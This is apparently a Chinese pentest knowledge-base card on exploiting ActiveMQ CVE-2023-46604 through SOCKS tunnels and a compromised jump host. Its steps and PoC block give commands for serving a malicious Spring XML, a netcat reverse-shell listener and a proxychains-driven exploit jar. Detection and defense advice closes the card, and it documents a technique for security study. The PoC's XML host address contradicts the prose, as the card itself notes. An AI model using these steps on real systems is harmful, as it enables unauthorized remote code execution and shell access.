---
id: web-java-deserialization-activemq-46604-proxied-xml-rce
title: ActiveMQ CVE-2023-46604 经多层代理的 XML 外带 RCE 与反弹 shell
type: scenario
domain: web
path: web/java/deserialization
technique: activemq-openwire-proxied-xml-rce
tags:
- activemq
- cve-2023-46604
- openwire
- 反序列化
- rce
- proxychains
- 内网代理
- 反弹shell
cve:
- CVE-2023-46604
severity: high
confidence: high
status: verified
created: '2026-11-07'
updated: '2026-11-07'
verification:
  verified_by: verifier-T1-2
  verified_at: '2026-11-07T22:08:36+08:00'
  notes: 已对照原文核对；CVE-2023-46604 OpenWire createThrowable 加载远程 Spring XML、proxychains 走 Socks5 隧道1123、跳板 python3 -m http.server 托管 poc.xml、nc -lvnp 4444 接反弹 shell 得 root 与图26至31一致；dedup_review对比 openwire-throwable-constructor-rce(直连61616根因卡)与 46604-intranet-ini-environment-getter-setter(不出网时 Shiro INI 触发 getter/setter 变体)成立，本卡为多层代理内网把 XML 托管在已控跳板并经隧道驱动 exp、回连跳板的第三种环境变体，非同一利用链；问题记录：PoC 中 http://10.10.10.70/poc.xml 与原理段 poc.xml 托管在已控跳板10.10.10.60 自相矛盾，原文图29为10.10.10.70而正文第167行为10.10.10.60，worker采用图29值，建议作者统一为跳板地址；原文仅图26受影响版本目录无具体号、图29 Target version 5.17.3 为目标环境版本，无受影响版本区间，已clear不猜测；cve=CVE-2023-46604；非DoS崩溃或仅资源耗尽、非未打通理论链；未验证点：PoC为结构示意未执行
url: /docs/web/java/deserialization/web-java-deserialization-activemq-46604-proxied-xml-rce/
draft: false
kb_aliases:
- ActiveMQ 46604 内网利用
- OpenWire 反序列化
- proxychains activemq-exp
- poc.xml 外带
- nc 反弹 shell
---

## 一句话结论

当内网 ActiveMQ 开放 61616 OpenWire 且管理台仍是默认口令时，可利用 CVE-2023-46604 的 OpenWire 反序列化让 Broker 加载攻击者指定的远程 Spring XML 执行命令；在多层代理环境里，把 poc.xml 托管在已控同网段跳板上、用 proxychains 驱动 exp、并将回连指向跳板监听端口，即可在无直接出站的深层内网完成 RCE 与反弹 shell。

## 原理

- CVE-2023-46604 源于 ActiveMQ OpenWire 协议对 `ExceptionResponse` 中 Throwable 类名的处理：客户端可指定任意带 `String` 构造方法的异常类，`ClassPathXmlApplicationContext(String)` 正是这类——传入一个 URL 就会让 Broker 去加载并实例化远程 Spring XML，XML 中的 bean 可调用 `ProcessBuilder`/`Runtime.exec` 执行命令。
- 利用前提是能连到 61616（OpenWire 端口），且通常先通过 8161 Web 管理台的默认口令 `admin/admin` 确认版本/服务可用。
- 多层内网里攻击机直连不到 10.10.10.70，需先在上层已控主机建 Socks5 隧道，再让不支持代理的 Java exp 经 `proxychains` 走隧道；同时 XML 的 URL 必须是"目标能访问到的地址"，因此把 poc.xml 放在同网段已控跳板（10.10.10.60）临时 http 服务上，而非公网攻击机。
- 反弹 shell 同理：目标无出站回攻击机，改为回连同网段跳板，由跳板 `nc -lvnp 4444` 接收。原文据此拿到 root shell 与根目录 flag。

## 触发条件

- 目标 ActiveMQ 为受 CVE-2023-46604 影响的版本，61616 OpenWire 可达（8161 管理台常为 admin/admin 默认口令）。
- 攻击者已控制同网段一台主机，可建隧道并在其上托管文件/监听端口。
- 攻击机 exp 可经 proxychains/SOCKS 隧道访问 61616；目标能访问托管 poc.xml 的跳板 HTTP 服务，且能回连跳板监听端口。

## 利用步骤

1. 内网扫描发现 8161/61616，用 admin/admin 登录管理台确认 Apache ActiveMQ，搜索对应 CVE 与 exp。
2. 在已控跳板上新增 Socks5 隧道端口，Kali 在 `/etc/proxychains4.conf` 配置该 socks5。
3. 在已控内网主机起 `python3 -m http.server 8000`，把构造好的 poc.xml（含执行命令/反弹 shell 的 Spring bean）放到 Web 目录，得到 `http://<跳板>/poc.xml`。
4. 在跳板上 `nc -lvnp 4444` 监听回连（poc.xml 内反弹地址指向该跳板）。
5. 执行 `proxychains java -jar activemq-exp.jar <target> 61616 xml http://<跳板>/poc.xml`，触发 Broker 加载远程 XML。
6. 观察 `[+] Success / Exploit completed` 与跳板 nc 收到 root shell，读取目标根目录数据。

## PoC

```text
# 跳板（已控内网主机 10.10.10.60）
python3 -m http.server 8000          # 托管 poc.xml
nc -lvnp 4444                        # 接收反弹 shell

# Kali（经 Socks5 隧道）
/etc/proxychains4.conf:  socks5 <C2> 1123
proxychains java -jar activemq-exp.jar 10.10.10.70 61616 xml http://10.10.10.70/poc.xml

# 输出要点
[+] Target version: 5.17.3
[+] Success / Exploit completed
# 跳板 nc 收到 connect to [...] from [UNKNOWN] ... -> root@<target>:/opt/activemq#
```

（IP/路径/版本为结构示意，未执行任何 PoC；poc.xml 内容为最小化占位，不含可执行载荷。）

## 变体与关联

- 变体：不出网时也可改用 `IniEnvironment` 加载 Shiro INI 触发 getter/setter 链的利用方式（库内另有对应卡），与本卡"托管远程 XML + 反弹 shell"是不同变体。
- 变体：命令可直接写 webshell/落地文件而非反弹 shell；XML URL 也可指向任何目标可达的 HTTP 服务。
- 关联：隧道/代理/跳板与"多层 SOCKS 隧道代理链 + 正向木马"卡互补——本卡是该链在 ActiveMQ 这一层的具体落地漏洞。
- 关联：8161 默认口令、Jolokia/NetworkConnector 等其他 ActiveMQ RCE 入口属不同漏洞。

## 检测与防御

- 检测：61616 上出现携带异常类名/`ClassPathXmlApplicationContext` 的 OpenWire ExceptionResponse；Broker 进程发起对外 HTTP 拉取 XML、执行 `bash`/`nc` 等子进程；同网段出现临时 http 服务与异常监听端口。
- 防御：升级 ActiveMQ 到修复版本、限制 61616/8161 仅内网可信来源可达、修改默认口令。
- 防御：出站白名单禁止 Broker 主动访问任意 HTTP/回连；对中间件进程做最小权限与子进程行为告警。
- 防御：网络分段避免一台失陷主机成为通往深层 ActiveMQ 的跳板；及时清理默认口令与未授权管理台。
